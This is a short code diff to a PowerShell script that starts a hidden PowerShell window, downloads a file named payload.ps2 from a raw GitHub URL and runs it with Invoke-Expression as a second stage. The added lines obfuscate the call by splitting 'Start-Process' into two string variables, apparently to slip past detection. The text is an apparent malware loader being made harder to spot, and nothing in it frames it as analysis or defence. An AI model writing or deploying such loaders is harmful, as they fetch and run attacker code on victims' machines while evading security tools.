@@ -1,6 +1,8 @@
 $u = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
+$a = "Start-"; $b = "Process"
+$u = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
 if ($Args[0] -ne "SecondStage") {
-    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('$u') SecondStage"
+    & "$a$b" powershell.exe -ArgumentList "-NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('$u') SecondStage"
     exit
 }
 
